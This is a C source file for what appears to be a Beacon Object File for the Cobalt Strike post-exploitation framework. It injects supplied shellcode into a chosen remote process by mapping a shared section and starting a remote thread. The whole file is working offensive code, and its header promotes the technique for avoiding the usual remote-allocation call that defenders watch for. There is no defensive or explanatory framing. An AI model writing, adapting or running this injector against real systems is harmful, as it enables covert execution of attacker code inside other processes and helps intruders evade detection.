/*
 * inject_section.c - NtCreateSection + NtMapViewOfSection process injection BOF
 *
 * Injects shellcode into a remote process via shared section mapping.
 * Superior to VirtualAllocEx because no remote allocation call is made;
 * the section is mapped RW locally (for the copy) then RX remotely.
 *
 * Args:  target PID (int), shellcode (binary blob)
 */

#include <windows.h>

#define BOF
#include "beacon.h"

/* ── NT type definitions ── */
typedef LONG NTSTATUS;
#define NT_SUCCESS(status) ((NTSTATUS)(status) >= 0)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

/* ── NT function prototypes ── */
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    OBJECT_ATTRIBUTES* ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE  SectionHandle,
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T  CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD   InheritDisposition,
    ULONG   AllocationType,
    ULONG   Win32Protect
);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
);

/* ── DFR imports ── */
DFR(KERNEL32, OpenProcess)
DFR(KERNEL32, CreateRemoteThread)
DFR(KERNEL32, CloseHandle)
DFR(KERNEL32, GetCurrentProcess)
DFR(KERNEL32, GetModuleHandleA)
DFR(KERNEL32, GetProcAddress)

void go(char* args, int len)
{
    datap parser;
    int   targetPid;
    char* shellcode;
    int   shellcodeLen;

    BeaconDataParse(&parser, args, len);
    targetPid   = BeaconDataInt(&parser);
    shellcode   = BeaconDataExtract(&parser, &shellcodeLen);

    if (shellcode == NULL || shellcodeLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "inject_section: no shellcode provided");
        return;
    }

    /* Resolve ntdll functions */
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "inject_section: failed to get ntdll handle");
        return;
    }

    pNtCreateSection       NtCreateSection       = (pNtCreateSection)KERNEL32$GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection    NtMapViewOfSection    = (pNtMapViewOfSection)KERNEL32$GetProcAddress(hNtdll, "NtMapViewOfSection");
    pNtUnmapViewOfSection  NtUnmapViewOfSection  = (pNtUnmapViewOfSection)KERNEL32$GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection) {
        BeaconPrintf(CALLBACK_ERROR, "inject_section: failed to resolve ntdll functions");
        return;
    }

    /* Open target process */
    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)targetPid);
    if (hProcess == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "inject_section: OpenProcess failed for PID %d (err %lu)",
                     targetPid, GetLastError());
        return;
    }

    /* Create section */
    HANDLE         hSection  = NULL;
    LARGE_INTEGER  secSize;
    secSize.QuadPart = shellcodeLen;

    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &secSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "inject_section: NtCreateSection failed (0x%08X)", status);
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    /* Map into local process as RW for writing */
    PVOID   localBase = NULL;
    SIZE_T  viewSize  = 0;

    status = NtMapViewOfSection(
        hSection,
        KERNEL32$GetCurrentProcess(),
        &localBase,
        0,
        shellcodeLen,
        NULL,
        &viewSize,
        2, /* ViewUnmap */
        0,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "inject_section: local NtMapViewOfSection failed (0x%08X)", status);
        KERNEL32$CloseHandle(hSection);
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    /* Copy shellcode into local view */
    for (int i = 0; i < shellcodeLen; i++) {
        ((char*)localBase)[i] = shellcode[i];
    }

    /* Unmap local view - we no longer need it */
    NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), localBase);

    /* Map into remote process as RX */
    PVOID  remoteBase = NULL;
    viewSize = 0;

    status = NtMapViewOfSection(
        hSection,
        hProcess,
        &remoteBase,
        0,
        shellcodeLen,
        NULL,
        &viewSize,
        2, /* ViewUnmap */
        0,
        PAGE_EXECUTE_READ
    );

    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "inject_section: remote NtMapViewOfSection failed (0x%08X)", status);
        KERNEL32$CloseHandle(hSection);
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    /* Create remote thread at mapped shellcode */
    HANDLE hThread = KERNEL32$CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteBase,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "inject_section: CreateRemoteThread failed (err %lu)",
                     GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Injected %d bytes into PID %d at 0x%p",
                     shellcodeLen, targetPid, remoteBase);
        KERNEL32$CloseHandle(hThread);
    }

    /* Cleanup */
    KERNEL32$CloseHandle(hSection);
    KERNEL32$CloseHandle(hProcess);
}
